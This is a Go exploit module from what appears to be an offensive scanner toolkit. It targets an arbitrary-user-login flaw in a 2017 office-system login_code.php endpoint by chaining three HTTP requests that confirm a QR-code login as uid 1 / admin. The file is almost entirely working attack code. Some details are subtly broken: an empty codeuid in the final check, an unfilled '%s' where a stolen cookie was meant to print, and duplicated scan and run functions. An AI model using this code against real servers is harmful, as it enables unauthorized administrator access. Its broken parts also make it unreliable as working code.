package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td04 struct {
}

func (c *Td04) Scan(targetUrl string) {
	vulnerable, err := Td04scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td04] 存在v2017 login_code.php 任意用户登录，请执行Exp模块进行验证")
	} else {
		color.White("[Td04] 不存在v2017 login_code.php 任意用户登录")
	}
}

func (*Td04) Exploit(targetUrl string) {

	runResult, err := Td04runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult {
		color.Green("[Td04] 存在v2017 login_code.php 任意用户登录\n直接替换\n%s") //vulnCookie)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td04scancore(targetUrl string) (bool, error) {
	url := "/ispirit/login_code.php"
	resp10, err := baseClient.
		NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent10 := resp10.String()
	if resp10.StatusCode == 200 && strings.Contains(resContent10, "codeuid") {
		codeuid1 := resContent10[13:49]
		url2 := "/general/login_code_scan.php"
		dataDetail1 := "uid=1&codeuid={"
		dataDetail2 := "}&type=confirm&source=pc&username=admin"
		data2 := dataDetail1 + codeuid1 + dataDetail2
		resp9, err := baseClient.
			NewRequest().
			SetBodyString(data2).
			Post(targetUrl + url2)
		if err != nil {
			return false, err
		}
		resContent9 := resp9.String()
		if resp9.StatusCode == 200 && strings.Contains(resContent9, "1") {
			url3 := "/ispirit/login_code_check.php"
			resp8, err := baseClient.
				NewRequest().
				Get(targetUrl + url3 + "?codeuid={" + "}")
			if err != nil {
				return false, err
			}
			resContent8 := resp8.String()
			if resp8.StatusCode == 200 && strings.Contains(resContent8, "confirm") {
				return true, nil
			} else {
				return false, nil
			}

		} else {
			return false, nil
		}
	} else {
		return false, nil
	}

}

func Td04runcore(targetUrl string) (bool, error) {
	url := "/ispirit/login_code.php"
	resp10, err := baseClient.
		NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent10 := resp10.String()
	if resp10.StatusCode == 200 && strings.Contains(resContent10, "codeuid") {
		codeuid1 := resContent10[13:49]
		url2 := "/general/login_code_scan.php"
		dataDetail1 := "uid=1&codeuid={"
		dataDetail2 := "}&type=confirm&source=pc&username=admin"
		data2 := dataDetail1 + codeuid1 + dataDetail2
		resp9, err := baseClient.
			NewRequest().
			SetBodyString(data2).
			Post(targetUrl + url2)
		if err != nil {
			return false, err
		}
		resContent9 := resp9.String()
		if resp9.StatusCode == 200 && strings.Contains(resContent9, "1") {
			url3 := "/ispirit/login_code_check.php"
			resp8, err := baseClient.
				NewRequest().
				Get(targetUrl + url3 + "?codeuid={" + "}")
			if err != nil {
				return false, err
			}
			resContent8 := resp8.String()
			if resp8.StatusCode == 200 && strings.Contains(resContent8, "confirm") {
				return true, nil
			} else {
				return false, nil
			}

		} else {
			return false, nil
		}
	} else {
		return false, nil
	}
}
